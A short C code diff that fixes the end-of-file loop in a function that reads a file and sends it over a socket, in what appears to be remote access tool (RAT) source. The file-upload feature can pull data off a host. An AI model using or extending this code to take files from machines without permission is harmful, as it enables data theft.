@@ -55,7 +55,7 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 	errno_t errorNo = fopen_s(&fs, filePath, "rb");
 	if ( errorNo == 0 )
 	{
-		while( !feof(fs) )
+		for(;;)
 		{
 			char readBuffer[SOCKET_BUFFER_SIZE] = {};
 			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
@@ -69,9 +69,10 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 				OutputDebugStringA(readBuffer);
 				OutputDebugStringA("\n");
 			}
-			else
+			if ( readSize == 0 || feof(fs) )
 			{
 				SocketSend(ratSocket, "0", 1);
+				break;
 			}
 		}
 		OutputDebugString("DONE");
